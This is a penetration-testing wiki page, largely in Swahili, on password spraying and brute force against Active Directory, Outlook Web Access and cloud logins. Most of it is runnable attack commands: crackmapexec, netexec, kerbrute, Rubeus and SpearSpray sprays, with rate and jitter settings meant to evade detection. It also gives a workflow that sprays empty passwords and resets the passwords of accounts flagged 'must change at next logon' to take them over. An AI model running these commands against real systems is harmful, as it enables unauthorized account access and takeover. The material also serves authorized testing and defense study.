# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Mara tu unapopata kadhaa za **valid usernames** unaweza kujaribu **common passwords** zinazotumika zaidi (kumbuka **password policy** ya mazingira) kwa kila mtumiaji uliyegundua.\
Kwa **default** **minimum** **password** **length** ni **7**.

Lists of common usernames could also be useful: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Kumbuka kwamba unaweza **could lockout some accounts if you try several wrong passwords** (by default more than 10).

### Pata password policy

Ikiwa una user credentials au shell kama domain user unaweza **get the password policy with**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Exploitation kutoka Linux (au wote)

- Kutumia **crackmapexec:**
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Kutumia **NetExec (CME successor)** kwa spraying iliyolengwa, yenye kelele ndogo kupitia SMB/WinRM:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- Kutumia [**kerbrute**](https://github.com/ropnop/kerbrute) (Go)
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(unaweza taja idadi ya majaribio ili kuepuka kufungwa kwa akaunti):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- Kutumia [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) - Haipendekezwi; wakati mwingine haifanyi kazi
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- Kwa moduli ya `scanner/smb/smb_login` ya **Metasploit**:

![](<../../images/image (745).png>)

- Kwa kutumia **rpcclient**:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Kutoka Windows

- Kwa [Rubeus](https://github.com/Zer1t0/Rubeus) toleo lenye module ya brute:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- Kwa [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) (Inaweza kuunda watumiaji kutoka kwenye domain kwa chaguo-msingi na itapata sera ya nywila kutoka kwenye domain na kupunguza majaribio kulingana na sera hiyo):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- Kwa kutumia [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1)
```
Invoke-SprayEmptyPassword
```
### Tambua na Kuchukua Akaunti za "Password must change at next logon" (SAMR)

Mbinu yenye kelele kidogo ni spray a benign/empty password na kushika akaunti zinazorejesha STATUS_PASSWORD_MUST_CHANGE, ambayo inaonyesha password ilisitishwa kwa nguvu na inaweza kubadilishwa bila kujua password ya zamani.

Workflow:
- Orodhesha watumiaji (RID brute via SAMR) kujenga orodha ya malengo:

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Spray an empty password na endelea kwenye hits ili capture accounts ambazo lazima kubadilisha password at next logon:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Kwa kila hit, badilisha nenosiri kupitia SAMR kwa kutumia NetExec’s module (nenosiri la zamani halihitajiki wakati "must change" imewekwa):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Vidokezo vya uendeshaji:
- Hakikisha saa ya mwenyeji wako imepangwa sawa na DC kabla ya operesheni zinazotegemea Kerberos: `sudo ntpdate <dc_fqdn>`.
- A [+] bila (Pwn3d!) katika baadhi ya moduli (kwa mfano, RDP/WinRM) ina maana creds ni halali lakini akaunti haina interactive logon rights.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth–based spraying inapunguza kelele ikilinganishwa na SMB/NTLM/LDAP bind attempts na inaendana vizuri na AD lockout policies. SpearSpray inaunganisha LDAP-driven targeting, pattern engine, na policy awareness (domain policy + PSOs + badPwdCount buffer) ili kufanya spraying kwa usahihi na kwa usalama. Pia inaweza ku-tag principals waliodhulumiwa kwenye Neo4j kwa BloodHound pathing.

Key ideas:
- LDAP user discovery with paging and LDAPS support, optionally using custom LDAP filters.
- Domain lockout policy + PSO-aware filtering kuacha configurable attempt buffer (threshold) na kuepuka kufunga watumiaji.
- Kerberos pre-auth validation using fast gssapi bindings (generates 4768/4771 on DCs instead of 4625).
- Pattern-based, per-user password generation using variables like names and temporal values derived from each user’s pwdLastSet.
- Throughput control with threads, jitter, and max requests per second.
- Optional Neo4j integration to mark owned users for BloodHound.

Basic usage and discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Kulenga na udhibiti wa mifumo:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Vidhibiti vya usiri na usalama:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound uboreshaji:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Muhtasari wa mfumo wa pattern (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Available variables include:
- {name}, {samaccountname}
- Temporal from each user’s pwdLastSet (or whenCreated): {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers and org token: {separator}, {suffix}, {extra}

Operational notes:
- Favor querying the PDC-emulator with -dc to read the most authoritative badPwdCount and policy-related info.
- badPwdCount resets are triggered on the next attempt after the observation window; use threshold and timing to stay safe.
- Kerberos pre-auth attempts surface as 4768/4771 in DC telemetry; use jitter and rate-limiting to blend in.

> Kidokezo: SpearSpray’s default LDAP page size is 200; adjust with -lps as needed.

## Outlook Web Access

Kuna zana mbalimbali kwa ajili ya p**assword spraying outlook**.

- Kwa kutumia [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/)
- Kwa kutumia [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/)
- Kwa kutumia [Ruler](https://github.com/sensepost/ruler) (inayoaminika!)
- Kwa kutumia [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- Kwa kutumia [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Ili kutumia yoyote ya zana hizi, unahitaji orodha ya watumiaji na password / orodha ndogo ya passwords za spray.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## Marejeleo

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
